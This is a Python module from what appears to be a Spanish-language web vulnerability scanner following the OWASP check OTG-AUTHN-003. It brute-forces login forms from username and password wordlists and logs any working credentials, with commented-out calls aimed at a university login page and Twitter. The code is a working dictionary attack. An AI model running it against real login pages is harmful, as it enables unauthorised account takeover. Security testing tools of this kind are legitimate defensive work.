#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from terceros.mechanicalsoup.utils import LinkNotFoundError
from terceros.loginform import fill_login_form
from src.lib.utilLogin import iniciarSesion
from src.lib.Form import Form
from src.lib.Inputs import CampoForm
from urllib.parse import urlparse
from fabrica.otg import OTG
import requests

import copy

__otg__ = "OTG-AUTHN-003"

class Authn_003(OTG):
    def __init__(self,url, path, dependencia=None, riesgoNegocio=0.0):
        super().__init__(dependencia, __otg__, riesgoNegocio)
        self.url = url
        self.path = path
        self.usersDic = self.path + "/diccionarios/login/users.txt"
        self.passDic = self.path + "/diccionarios/login/passwords.txt"
        self.complejidad = 3

    def fuerzaBruta(self):
        b = None
        r = None
        msj = ""
        count = 0
        # Abrir el archivo de usuarios
        try:    
            with open(self.usersDic, 'r') as f:
                while True:
                    usuario = f.readline()
                    if usuario == "":
                        break
                    usuario = usuario[0:-1]

                    # Abrir el archivo de contraseñas
                    with open(self.passDic, 'r') as f2:
                        while True:
                            contraseña = f2.readline()
                            if contraseña == "":
                                break
                            contraseña = contraseña[0:-1]
                            try:
                                b, r = iniciarSesion(self.url, [usuario, contraseña])
                                print(usuario, contraseña)
                                count += 1
                                if "logout" in b.get_current_page().text.lower() or "cerrar sesión" in b.get_current_page().text.lower() or "signout" in b.get_current_page().text.lower() or "sign off" in b.get_current_page().text.lower():
                                    msj = "Usuario: < %s > Contraseña: < %s >" % (usuario, contraseña)
                                    self.adicionarResultado(msj)
                                    print(msj)
                            except requests.exceptions.ConnectionError:
                                continue
                    f2.close()
        except (LinkNotFoundError, requests.exceptions.ReadTimeout, requests.exceptions.HTTPError) as e:
            print("Exception: {}".format(e))
        finally:
            if self.detalles.resultado == "" and count > 15:
                msj = "No se encontró un usuario y contraseña pero es vulnerable a ataques de fuerza bruta para el inicio de sesión."
                self.adicionarResultado(msj)
                # self.almacenarBD()
            f.close()
        b.close()

    def main(self):
        u = urlparse(self.url)
        self.url = u.scheme + "://" + u.netloc + u.path
        print("================ Inicio prueba OTG-AUTHN-003 ==================\n")
        self.fuerzaBruta()
        print("\n================ Fin prueba OTG-AUTHN-003 ==================\n")

        if self.detalles.resultado != "":
            self.adicionarRecomendaciones('')
            self.calcularRiesgo(__otg__, self.riesgoNegocio)

            self.almacenarBD()
            return self.detalles
        else:
            return None

#main("https://simca.unicauca.edu.co/simca/index.xhtml")
#main("https://twitter.com/login")
